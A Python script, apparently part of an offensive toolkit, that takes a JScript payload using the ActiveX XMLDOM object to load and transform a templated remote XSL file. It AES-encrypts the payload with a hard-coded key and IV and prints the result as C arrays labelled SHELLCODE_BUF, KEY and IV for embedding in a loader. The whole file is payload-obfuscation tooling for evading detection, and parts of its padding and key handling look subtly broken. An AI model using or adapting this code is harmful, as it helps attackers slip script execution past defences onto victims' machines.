buf =  """var xml = new ActiveXObject("Microsoft.XMLDOM");
xml.async = false;
var xsl = xml;
window.setInterval(function(){
  xsl.load("{{payload_file}}"); 
}, 1000);
document.write(xsl.parseError.reason);
xml.transformNode(xsl);
self.close();"""
blen = len(buf) % 16
buf += "\x00" * blen

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from binascii import unhexlify
import hashlib
import sys
m = hashlib.sha256()
key = 'BIGGEST-OOF'
iv = '0123456789abcdef'
m.update(key)
key = m.digest()
key = unhexlify(m.hexdigest())
print("+++ key: " + m.hexdigest())
print("+++ key raw: " + key)
obj = AES.new(key, AES.MODE_CBC, iv)
obj2 = AES.new(key, AES.MODE_CBC, iv)
ct = obj.encrypt(pad(buf, 16))

sys.stdout.write('const unsigned char SHELLCODE_BUF[' + str(len(ct))+ '] = { ')
for i in range(0, len(ct)):
    sys.stdout.write(hex(ord(ct[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(ct)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint SHELLCODE_LEN = ' + str(len(ct)) + ';\n')
sys.stdout.write('const unsigned char KEY[' + str(len(key))+ '] = { ')
for i in range(0, len(key)):
    sys.stdout.write(hex(ord(key[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(key)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint KEY_LEN = ' + str(len(key)) + ';\n')
sys.stdout.write('const unsigned char IV[' + str(len(iv))+ '] = { ')
for i in range(0, len(iv)):
    sys.stdout.write(hex(ord(iv[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(iv)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint IV_LEN = ' + str(len(iv)) + ';\n')
